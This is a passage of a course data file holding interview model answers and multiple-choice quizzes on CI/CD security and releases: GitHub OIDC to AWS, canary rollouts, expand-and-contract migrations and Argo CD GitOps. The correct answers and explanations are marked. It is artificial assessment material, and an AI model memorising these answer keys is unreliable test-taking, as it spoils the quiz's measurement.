**Model answer.** "OIDC federation. The account has an IAM OIDC provider for token.actions.githubusercontent.com
with audience sts.amazonaws.com. Each pipeline role trusts it with conditions on aud and on sub — the sub carries
the repository and the branch, tag, pull_request or environment. The job gets permissions: id-token: write and
uses configure-aws-credentials with role-to-assume; STS returns credentials for about an hour. The role allows only
that deploy: push to one ECR repository, update one service, PassRole on the task roles only."

**Follow-up.** "What stops another repository using your role?" — "The sub condition, matched exactly. A wildcard
like repo:org/* lets any repository in. I pin it to environment:production, and the environment needs a
reviewer and only accepts main."

## Q3. "Blue-green or canary? And how do you roll back a database change?"

**Model answer.** "Blue-green gives an instant switch back but doubles capacity and exposes everyone at the
switch. Canary limits exposure and suits high-traffic, revenue-critical services, if there is automated analysis
against the stable version with a minimum sample. For the database, I don't roll it back: migrations are
expand-and-contract, each one backward compatible with the previous release, so rolling the code back is always
safe. Destructive steps come releases later. And risky features ship behind a flag, which is the fastest kill
switch."

**Follow-up.** "The canary's error rate is fine but orders dropped." — "Then the analysis watches the wrong
thing. I would add a business metric, like orders per minute per Pod, to the canary analysis."

## Q4. "What is GitOps, and what changes when you adopt Argo CD?"

**Model answer.** "Git holds the declared state of the cluster, and an agent in the cluster pulls and reconciles
it continuously. CI stops having cluster credentials — it builds, pushes and commits a new tag to the config
repo. Promotion is a pull request, rollback is a git revert, and Argo CD shows drift: OutOfSync when the cluster
differs from Git, with self-heal to revert manual changes. Secrets come from Secrets Manager through the External
Secrets Operator, never as plain Secrets in Git."

**Follow-up.** "Production is on fire and you need to change something now." — "A one-line PR with fast-track
review is usually quick enough. If not, I pause auto-sync on that one application, make the change, post it in
the incident channel, and put it into Git before turning sync back on — otherwise self-heal undoes it."`,
    mcqs: [
      mcq('Asked how to stop other repositories assuming the deploy role, which answer would an interviewer rate highest?', [
        ['An exact sub condition, ideally the environment form with reviewers', true],
        ['The aud condition, since aud names the repository that asked for it', false],
        ['Rotate the role\'s access key often so a leaked key soon stops working', false],
        ['Keep the role ARN secret, since nobody can assume a role they cannot name', false],
      ], 'The sub claim identifies repository and context, so an exact match is the control. aud is sts.amazonaws.com for every GitHub workflow, roles have no access keys, and a role ARN is not a secret.'),
      mcq('In an interview a candidate says "if the migration goes wrong we restore the database and roll back". What would a strong candidate say instead?', [
        ['Make migrations expand-and-contract so code rollback never needs a restore', true],
        ['Run all migrations by hand at night, so that nobody uses the database then', false],
        ['Take a snapshot before every deploy and restore it on any failed canary', false],
        ['Avoid database changes entirely during a quarter that has any sale days', false],
      ], 'Backward-compatible migrations make code rollback safe and avoid losing the writes since the release. Night-time manual runs still break rollback, a restore discards real orders, and freezing schema changes for a quarter is not a strategy.'),
      mcq('An interviewer asks what CI needs in a GitOps setup with Argo CD. Which answer is correct?', [
        ['Push rights to the registry and write access to the config repo', true],
        ['Cluster-admin credentials, so it can apply manifests after a build', false],
        ['The Argo CD admin password, so it can create and sync Applications', false],
        ['SSH access to the worker nodes, so it can pull images on each node', false],
      ], 'In the pull model CI builds and pushes the image and commits the tag; the in-cluster agent does the rest. Cluster-admin and Argo CD admin credentials in CI bring back the risk GitOps removes, and nodes pull images themselves.'),
    ],
  },

  /* ── CHECKPOINT ──────────────────────────────────────────────────────────────────────── */
  {
    unitCode: 'CL_CICD_GITOPS_CHECKPOINT',
    notes: `Ten questions across the topic: pipeline design, GitHub Actions to AWS with OIDC, supply-chain security, release
strategies and rollback, and GitOps with Argo CD. Answer without notes; the result shows which lesson to revisit.`,
    checkpoint: [
      mcq('What does "promote to production" mean in a build-once pipeline?', [
        ['Point production at the image digest that already passed staging', true],
        ['Rebuild from the same commit with production settings baked in', false],
        ['Re-tag the newest image in the registry as prod and pull that tag', false],
        ['Merge the release branch into main and let the build run again', false],
      ], 'Promotion moves the same artefact forward; configuration comes from the environment. Rebuilding or baking settings creates an untested artefact, a moving prod tag loses traceability, and a merge triggers a new build.'),
      mcq('Kiranakart has deploys 2.3 times a week, 48 h lead time, 20% change failure rate and 108 min to restore. Which two of these measure stability?', [
        ['Change failure rate and time to restore service', true],
        ['Deployment frequency and the lead time for changes', false],
        ['Lead time for changes and change failure rate only', false],
        ['Deployment frequency and the time to restore service', false],
      ], 'DORA groups failure rate and restore time as stability, frequency and lead time as throughput. The other pairs mix the two groups.'),
      mcq('Which claim in a GitHub OIDC token identifies the repository and its branch, tag, PR or environment?', [
        ['sub', true],
        ['aud', false],
        ['iss', false],
        ['exp', false],
      ], 'sub carries repo:owner/name plus the context. aud is the intended audience (sts.amazonaws.com), iss is GitHub\'s issuer URL, and exp is the expiry time.'),
      mcq('What must a GitHub Actions job declare before configure-aws-credentials can use OIDC?', [
        ['permissions: id-token: write', true],
        ['permissions: contents: write', false],
        ['secrets: inherit on the job', false],
        ['env: AWS_OIDC: "true" for it', false],
      ], 'id-token: write lets the job request an OIDC token. contents: write is about the repository, secrets: inherit is for reusable workflows, and there is no AWS_OIDC switch.'),
      mcq('Why should a third-party action be referenced by a full commit SHA rather than a version tag?', [
        ['A tag can be moved to other code; a SHA always names the same code', true],
        ['GitHub runs SHA-pinned actions faster, since they skip a download', false],
        ['Version tags are only allowed for actions published by GitHub itself', false],
        ['A SHA makes the action run with a read-only GITHUB_TOKEN by default', false],
      ], 'Moving tags is how the tj-actions compromise reached thousands of repositories. Pinning has no speed effect, tags are allowed for any action, and token permissions are set by permissions:, not by how an action is referenced.'),
      mcq('An image scan blocks on HIGH findings with a fixed version. A HIGH finding has no fix yet. What is the sound handling?', [
        ['A reviewed exception with a reason, an owner and an expiry date', true],
        ['Set the scan step\'s exit code to 0 until the vendor releases a fix', false],
        ['Delete the scan job and rely on the registry\'s weekly scan instead', false],
        ['Rebuild the image without cache until the finding stops appearing', false],
      ], 'An expiring, reviewed exception keeps the gate intact and the risk visible. Exit code 0 or deleting the job disables the gate for everything, and rebuilding does not remove a vulnerable package.'),
      mcq('A release is healthy by health checks but returns errors to users. Which ECS feature rolls it back?', [
        ['Deployment alarms on a CloudWatch error alarm with rollback', true],
        ['The deployment circuit breaker watching task start failures', false],
        ['Setting minimumHealthyPercent to 100 for the whole service', false],
        ['A larger desired count, so errors are spread across tasks', false],
      ], 'Only an alarm on the user-facing error metric sees healthy-but-wrong tasks. The circuit breaker reacts to tasks failing to start or pass health checks, minimumHealthyPercent sets pace, and more tasks do not fix errors.'),
      mcq('Which migration plan lets Kiranakart roll orders-api back one release at any point?', [
        ['Add the new column and dual-write first; drop the old one releases later', true],
        ['Rename the column in the same release that starts using the new name', false],
        ['Drop the old column first, then add the new one in the next release', false],
        ['Run the migration after the deploy, so that old code never sees it', false],
      ], 'Expand-then-contract keeps every schema compatible with the previous release. Renaming or dropping first breaks the old code, and running after the deploy means the new code starts without the column it needs.'),
      mcq('An Argo CD Application with selfHeal shows OutOfSync right after someone ran kubectl edit in production. What happens next?', [
        ['Argo CD reapplies what Git declares, undoing the edit', true],
        ['Argo CD commits the edit to Git so the two match again', false],
        ['The Application is deleted along with its resources', false],
        ['Nothing, until a person clicks Sync in the Argo CD UI', false],
      ], 'Self-heal reconciles the cluster back to Git. Argo CD never writes to Git, deletion follows deleting the Application (with its finalizer), and waiting for a manual sync is the behaviour without selfHeal.'),
      mcq('Under GitOps, how is a bad production release rolled back?', [
        ['git revert the promotion commit, reviewed, and let Argo CD sync it', true],
        ['kubectl rollout undo in production, then leave the Git repo as it is', false],
        ['Re-run the old CI pipeline so it applies the previous manifests again', false],
        ['Delete the Application in Argo CD and create it again from the UI', false],
      ], 'The revert changes the declared state, so it is recorded and stays put. A kubectl undo is reverted by self-heal (or leaves Git lying), CI no longer applies manifests, and deleting the Application removes the workload.'),
    ],
  },
];
